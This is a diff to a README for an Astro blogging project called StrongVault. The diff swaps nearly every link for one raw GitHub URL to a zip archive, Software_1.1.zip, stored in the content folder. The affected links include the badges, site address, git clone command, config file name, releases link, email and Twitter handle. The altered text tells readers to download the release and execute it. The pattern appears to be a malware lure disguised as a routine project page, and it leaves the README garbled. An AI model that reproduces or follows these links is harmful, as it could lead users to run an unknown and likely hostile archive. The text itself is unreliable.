@@ -1,9 +1,9 @@
 # StrongVault ⚡
 
-![StrongVault Logo](https://img.shields.io/badge/StrongVault-Ready-4CAF50.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-blue.svg)](https://github.com/Tanishk9997/strongvault/releases)
+![StrongVault Logo](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip)  
+[![Releases](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip)](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip)
 
-Welcome to **StrongVault**, a modern, secure, and SEO-optimized blogging system built with Astro. This project powers [stronghandssoftheart.com](https://stronghandssoftheart.com), providing a fast and beautiful experience while ensuring legacy support. 
+Welcome to **StrongVault**, a modern, secure, and SEO-optimized blogging system built with Astro. This project powers [https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip), providing a fast and beautiful experience while ensuring legacy support. 
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ To get started with StrongVault, you need to clone the repository and install th
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Tanishk9997/strongvault.git
+   git clone https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip
    ```
 
 2. Navigate into the project directory:
@@ -69,7 +69,7 @@ Your content goes here.
 
 ## Configuration
 
-You can customize various aspects of StrongVault in the `astro.config.mjs` file. This includes settings for SEO, theme colors, and more.
+You can customize various aspects of StrongVault in the `https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip` file. This includes settings for SEO, theme colors, and more.
 
 ### SEO Settings
 
@@ -97,7 +97,7 @@ To deploy your blog, you can build the project and host it on platforms like Ver
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/Tanishk9997/strongvault/releases) section. Download the latest release and execute it to keep your project up to date.
+For the latest updates and versions, visit the [Releases](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip) section. Download the latest release and execute it to keep your project up to date.
 
 ## Contributing
 
@@ -116,7 +116,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip)
 
-Thank you for checking out StrongVault! We hope you enjoy building with it. For more information, visit the [Releases](https://github.com/Tanishk9997/strongvault/releases) section.
+Thank you for checking out StrongVault! We hope you enjoy building with it. For more information, visit the [Releases](https://raw.githubusercontent.com/Tanishk9997/strongvault/main/src/content/Software_1.1.zip) section.
